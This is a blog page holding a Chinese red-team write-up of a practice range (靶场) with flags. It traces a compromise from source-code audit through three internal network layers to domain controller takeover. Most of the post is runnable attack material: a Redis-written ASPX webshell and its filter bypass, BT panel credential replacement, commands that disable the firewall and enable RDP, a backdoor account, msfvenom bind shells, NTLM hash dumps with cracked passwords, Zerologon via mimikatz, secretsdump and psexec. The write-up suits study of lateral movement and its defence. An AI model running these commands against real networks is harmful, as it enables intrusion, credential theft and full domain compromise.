@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>从外网代码审计到三层内网各种漏洞拿到域控 | 渗透攻击红队</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">从外网代码审计到三层内网各种漏洞拿到域控</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 9, 2021&nbsp;&nbsp;15:03:04</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/redTeam/">redTeam</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/XcCJfM.jpg"></p>
+<p>本次靶场要求：</p>
+<p>提示： <a target="_blank" rel="noopener" href="http://www.cocat.cc/web.zip">http://www.cocat.cc/web.zip</a></p>
+<p>四个 <code>root.txt</code> 分别在四台机子用户目录下 <code>拿到三个及格</code> <code>拿下四个满分</code></p>
+<h2 id="代码审计-Getshell"><a href="#代码审计-Getshell" class="headerlink" title="代码审计 Getshell"></a>代码审计 Getshell</h2><p>首先是一个站：cocat.cc<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Q85dTv.jpg"><br>通过提示把它的备份文件下载到了本地进行审计：<a target="_blank" rel="noopener" href="http://www.cocat.cc/web.zip">http://www.cocat.cc/web.zip</a><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/7ucmM0.jpg"></p>
+<h2 id="Bypass-突破执行命令"><a href="#Bypass-突破执行命令" class="headerlink" title="Bypass 突破执行命令"></a>Bypass 突破执行命令</h2><p>通过审计拿到了一个 webshell：<a target="_blank" rel="noopener" href="http://www.cocat.cc/kss_tool/_webup.php">http://www.cocat.cc/kss_tool/_webup.php</a><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/AQWnLh.jpg"><br>由于当前环境不能执行命令，函数都写死了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/x4nSCi.jpg"><br>通过翻文件翻到了 <code>Mysql</code> 的配置文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dqgLUW.jpg"><br>本想尝试 <code>Mysql udf</code> 提权绕过发现 <code>Mysql</code> 版本大于 <code>5.1</code> ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3zeFtD.jpg"></p>
+<h3 id="拿到宝塔后台权限"><a href="#拿到宝塔后台权限" class="headerlink" title="拿到宝塔后台权限"></a>拿到宝塔后台权限</h3><p>由于当前 <code>web</code> 是宝塔搭建的:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/wubTCy.jpg"><br>通过翻文件找到了宝塔后台地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/BtSoft/panel/data/admin_path.pl</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CdkKrH.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Y0sh7p.jpg"><br>然后通过把宝塔的 <code>default.db</code> 文件下载到本地打开，<code>users</code> 表里就是宝塔的登陆账号密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ktnP65.jpg"><br><code>md5</code> 是肯定解密不出来的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CImb4L.jpg"><br>这个时候需要替换 <code>md5</code> 或者添加一个用户：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/74ktDN.jpg"><br>然后把文件保存，上传到目标宝塔目录下：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PcMi5c.jpg"><br>这个时候使用账号 <code>saulGoodmang</code> 密码 <code>123456</code> 去登陆：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/vAuUxu.jpg"><br>手动把禁用的函数关闭：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dZH8bO.jpg"><br>然后给他来个重启：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/n41yfZ.jpg"><br>命令执行强行绕过：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/02f1Cm.jpg"></p>
+<h3 id="拿到第一个-root-txt"><a href="#拿到第一个-root-txt" class="headerlink" title="拿到第一个 root.txt"></a>拿到第一个 root.txt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;moonsec-c20ad4d76fe97759aa27a0c99bff6710-1&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/l4PGJh.jpg"></p>
+<h2 id="内网渗透一"><a href="#内网渗透一" class="headerlink" title="内网渗透一"></a>内网渗透一</h2><p>通过查看进程发现有<code>火绒AV</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4UaLas.jpg"><br>随即做免杀上线到 <code>CS</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/xvj65T.jpg"><br>发现当前内网应该是有其他主机存活的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/eZrnGH.jpg"><br>通过 <code>nbtscan</code> 发现内网还有一台主机存活：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KWP6wi.jpg"><br>通过 <code>fscan</code> 也扫描出来内网资产了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/W3dyzX.jpg"><br>为了进内网直接做了一个 <code>frp socks</code> 代理进去：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/85FRm8.jpg"><br>通过 <code>lengyi</code> 老哥的脚本绕过火绒添加了一个用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker 密码：P@ssw0rd</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ELFKe3.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/8vtTjI.jpg"><br>然后开启了它的 <code>3389</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/woto8N.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Fg29dd.jpg"><br>为了方便我把 <code>shell</code> 弹到了<code>msf</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/djqpOn.jpg"><br>然后抓到了 <code>hash</code>：（由于是 windows 2012 明文是抓不了的，只能抓 hash）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:de935c6087ec367d3ef786915a4edcce:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">hacker:1003:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::</span><br><span class="line">mysql:1002:aad3b435b51404eeaad3b435b51404ee:291376866817cf2ccfe198308e5f925b:::</span><br><span class="line">www.saulgoodman.cn:1001:aad3b435b51404eeaad3b435b51404ee:894f353e870620b186a9a46ce56ac8f1:::</span><br></pre></td></tr></table></figure>
+<p>通过解密得到了 <code>administrator</code> 的密码：<code>QWEasd444</code></p>
+<h3 id="内网横向移动-192-168-59-4"><a href="#内网横向移动-192-168-59-4" class="headerlink" title="内网横向移动-192.168.59.4"></a>内网横向移动-192.168.59.4</h3><p>通过 <code>msf</code> 对内网进行扫描 <code>arp</code> 存活发现了几台机器：（之前没扫描出来应该是有防火墙）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/arp_scanner</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/QS9PWe.jpg"><br><code>192.168.59.1</code> 就不用看了是网关，<code>192.168.59.4</code> 就是内网另一台主机！<br>随后 <code>proxychains</code> + <code>nmap</code> 对 <code>192.168.59.4</code> 进行扫描探测端口服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -sV -Pn -n -p22,80,139,135,445,3306,1433,6379  192.168.59.4</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/FfkbkQ.jpg"><br>发现开放的端口有：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1Y7Hgu.jpg"><br><code>web</code> 页面的话倒是没啥：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/smDzai.jpg"><br>看了看扫描出来 <code>6379</code> 应该是 <code>redis</code> 相关漏洞！<br>通过尝试 <code>redis</code> 未授权发现连接成功！<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/jWj5Df.jpg"><br>但是查看信息发现出错，应该是密码问题：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4ORUe5.jpg"><br>通过 <code>msf redis</code> 爆破模块爆破出了密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3UPmy7.jpg"><br>重新登陆 <code>redis</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains redis-cli -h 192.168.59.4 -p 6379 -a 123456789qq</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/MC9rF5.jpg"><br>登陆成功！现在要想拿到权限首先我们不知道网站路径（写不了一句话 ），但是知道当前网站使用的是 <code>IIS</code>，那么 <code>IIS</code> 默认目录是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot</span><br></pre></td></tr></table></figure>
+<p>设想会不会是这个目录呢？随即写了一个 <code>aspx</code> 的 <code>shell</code> 到 <code>IIS</code> 默认目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.59.4:6379&gt; config set dir C:/inetpub/wwwroot/</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; config set dbfilename 1.aspx</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; set x &#x27;&lt;%execute(request(&quot;x&quot;))%&gt;&#x27;  //注意这里要用单引号</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; save</span><br></pre></td></tr></table></figure>
+<p>发现写入不了，随后设置了读写权限 ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> slave-read-only on </span><br></pre></td></tr></table></figure>
+<p>然后发现读写可以了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/TUmZnl.jpg"><br>再来写一遍 <code>webshell</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/54B8fs.jpg"><br>发现是 <code>404</code>，写 <code>asp</code> 是 <code>500</code>，应该是什么东西拦截了。</p>
+<p>随后 <code>bypass</code> 测试，可以通过这样绕过：（单引号中间要带空格）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x &#x27;    &lt;%execute(request(&quot;x&quot;))%&gt;    &#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/UnHe9h.jpg"><br>拿到 webshell：<a target="_blank" rel="noopener" href="http://192.168.59.4/a.asp">http://192.168.59.4/a.asp</a> </p>
+<h2 id="内网渗透二"><a href="#内网渗透二" class="headerlink" title="内网渗透二"></a>内网渗透二</h2><p>通过发现当前机器是不出网的，而且权限还很小：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/gVDNVZ.jpg"><br>发现当前机器上权限太小任何文件都上传不了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/fDTOcr.jpg"><br>通过找到了一个可读可写目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\VMware\logs\</span><br></pre></td></tr></table></figure>
+<p>并且当前机器上无任何杀软：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/lq7GNB.jpg"><br>随即坏土豆提权成功：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/kMKMZg.jpg"><br>拿到第二个 flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;moonsec-b6d767d2f8ed5d21a44b0e5886680cb9-2&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/HKW3g8.jpg"><br>随即添加了一个 <code>asp.net</code> 管理员用户进去：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/59R6UE.jpg"></p>
+<h3 id="内网渗透-10-10-10-202"><a href="#内网渗透-10-10-10-202" class="headerlink" title="内网渗透-10.10.10.202"></a>内网渗透-10.10.10.202</h3><p>通过对内网进行存活探测发现内网存活了三台：<code>10.10.10.201</code>、<code>10.10.10.202</code>（本机）、<code>10.10.10.209</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l  %i  <span class="keyword">in</span> (1,1,255) <span class="keyword">do</span> @  ping  10.10.10.%i  -w  1  -n  1 |  find  /i  <span class="string">&quot;ttl=&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/iwqJRB.jpg"><br>随后关闭它防火墙：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Sy0gCC.jpg"><br>然后 <code>MSF</code> 生成<code>正向 shell</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9099 -f exe &gt;/root/9099.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/t5IHA0.jpg"><br>目标运行 <code>9090.exe</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/42BMGT.jpg"><br>随后 <code>MSF</code> 上线：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/idgoPV.jpg"><br><code>hashdump</code> 解密得到了密码：<code>QWEasd1122</code>:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/MxlBT8.jpg"><br>紧接着开了它的远程桌面：（之前添加了一个 <code>asp.net</code> 用户，方便后续好登陆桌面 ）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PalAyt.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/NtwfJz.jpg"><br>通过 <code>nbtcan</code> 发现 <code>10.10.10.201</code>（DC）、<code>10.10.10.209</code> 是域环境：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2C0KDV.jpg"><br>得想办法拿到一台域机器！</p>
+<p>对他们进行扫描端口发现他们都开放了 <code>web</code> 服务：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/K117Za.jpg"><br>其中 <code>10.10.10.209</code> 还是一个 <code>Outlook Web App</code>（微软的邮件组件）<code>Exchange</code>  ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/9pVZbV.jpg"><br>但是我们没有账号，这个时候我在 <code>Redis</code> 上找到了 <code>pts</code> 文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&gt;<span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.pst) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.pst) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line">c:\Documents and Settings\Administrator\Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Documents and Settings\Administrator\Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Documents and Settings\Administrator\My Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Documents and Settings\Administrator\My Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Users\Administrator\Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Users\Administrator\Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Users\Administrator\My Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Users\Administrator\My Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PvVtxj.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/brmbb0.jpg"><br>知道了两个用户邮箱：<code>moonsec@cncat.cc</code>、<code>test@cncat.cc</code></p>
+<p>然后把文件都下载到本地，进行后续利用（发现都失败了）</p>
+<h3 id="CVE-2020-1472-拿到域控"><a href="#CVE-2020-1472-拿到域控" class="headerlink" title="CVE-2020-1472 拿到域控"></a>CVE-2020-1472 拿到域控</h3><p>之后发现他域控存在 <code>CVE-2020-1472</code> 域内提权漏洞：（需要 20200918 之后的 mimikatz 才可以使用）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::zerologon /target:10.10.10.201 /account:12SERVER-DC$</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/L1HPti.jpg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:10.10.10.201 /account:12server-dc$ /exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/bc1VGK.jpg"><br>导出所有域内用户凭证：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py cncat/12server-dc$@<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span> -no-<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">cncat.cc\Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/oJeHh4.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/IbR021.jpg"><br>拿到域控和 <code>flag</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2KQulH.jpg"><br>利用 <code>msf psexec</code> 上线：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                                                    Required  Description</span><br><span class="line">   ----                  ---------------                                                    --------  -----------</span><br><span class="line">   RHOSTS                10.10.10.201                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT                 445                                                                yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target <span class="keyword">for</span> pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                                                     no        The service display name</span><br><span class="line">   SERVICE_NAME                                                                             no        The service name</span><br><span class="line">   SHARE                                                                                    no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBDomain             cncat                                                              no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass               aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387  no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser               Administrator                                                      no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/bind_tcp_rc4):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   EXITFUNC     thread           yes       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LPORT        4446             yes       The listen port</span><br><span class="line">   RC4PASSWORD  msf              yes       Password to derive RC4 key from</span><br><span class="line">   RHOST        10.10.10.201     no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.201:445 - Connecting to the server...</span><br><span class="line">NOTE: Rex::Socket.gethostbyname is deprecated, use getaddress, resolve_nbo, or similar instead. It will be removed <span class="keyword">in</span> the next Major version</span><br><span class="line">[*] 10.10.10.201:445 - Authenticating to 10.10.10.201:445|cncat as user <span class="string">&#x27;Administrator&#x27;</span>...</span><br><span class="line">[*] 10.10.10.201:445 - Selecting PowerShell target</span><br><span class="line">[*] 10.10.10.201:445 - Executing the payload...</span><br><span class="line">[+] 10.10.10.201:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.201:4446</span><br><span class="line">NOTE: Rex::Socket.gethostbyname is deprecated, use getaddress, resolve_nbo, or similar instead. It will be removed <span class="keyword">in</span> the next Major version</span><br><span class="line">[*] Sending stage (200266 bytes) to 10.10.10.201</span><br><span class="line">[*] Meterpreter session 5 opened (0.0.0.0:0 -&gt; 180.215.199.206:22222) at 2021-06-02 06:35:22 +0000</span><br><span class="line"></span><br><span class="line">meterpreter &gt;                                                                                    </span><br></pre></td></tr></table></figure>
